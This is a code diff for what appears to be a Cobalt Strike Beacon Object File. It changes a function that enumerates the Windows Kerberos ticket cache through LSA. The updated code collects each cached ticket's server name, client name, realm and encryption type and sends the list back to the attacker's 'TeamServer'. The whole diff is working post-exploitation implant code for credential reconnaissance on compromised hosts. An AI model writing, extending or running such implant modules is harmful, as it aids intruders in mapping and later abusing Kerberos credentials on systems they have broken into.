@@ -43,6 +43,7 @@ VOID KrbListGo( _In_ PVOID Argv, _In_ INT Argc )
 	HANDLE					Lsa = NULL;
 	HANDLE					S32 = NULL;
 	HANDLE					Ntl = NULL;
+	PBUFFER					Out = NULL;
 	PKERB_QUERY_TKT_CACHE_REQUEST		Kcr = NULL;
 	PKERB_QUERY_TKT_CACHE_EX_RESPONSE	Res = NULL;
 
@@ -87,9 +88,25 @@ VOID KrbListGo( _In_ PVOID Argv, _In_ INT Argc )
 						/* Query the tickets from Lsa */
 						if ( NT_SUCCESS( Api.LsaCallAuthenticationPackage( Lsa, Kid, Kcr, sizeof( KERB_QUERY_TKT_CACHE_REQUEST ), &Res, &RLn, &Pst ) ) ) {
 							if ( NT_SUCCESS( Pst ) ) {
-								/* Enumerate each individual ticket */
-								for ( INT Idx = 0 ; Idx < Res->CountOfTickets ; ++Idx ) {
-									BeaconPrintf( CALLBACK_OUTPUT, "Ticket ETYPE: 0x%x", Res->Tickets[ Idx ].EncryptionType );
+								/* Create an output buffer for printing */
+								if ( ( Out = BufferCreate() ) != NULL ) {
+
+									BufferPrintf( Out, "Cached Tickets: {%i}\n", Res->CountOfTickets );
+
+									/* Enumerate each individual ticket */
+									for ( INT Idx = 0 ; Idx < Res->CountOfTickets ; ++Idx ) {
+										BufferPrintf( Out, "		Server Name	: %wZ @ %wZ\n", Res->Tickets[ Idx ].ServerName, Res->Tickets[ Idx ].ServerRealm );
+										BufferPrintf( Out, "		Client Name	: %wZ @ %wZ\n", Res->Tickets[ Idx ].ClientName, Res->Tickets[ Idx ].ClientRealm );
+										BufferPrintf( Out, "		Encryption	: %i\n", Res->Tickets[ Idx ].EncryptionType );
+									};
+
+									/* Print the information back to the TeamServer */
+									BeaconOutput( CALLBACK_OUTPUT, Out->Buffer, Out->Length );
+
+									/* Free the buffer */
+									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out->Buffer );
+									Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Out );
+									Out = NULL;
 								};
 							};
 							/* Free the return buffer */
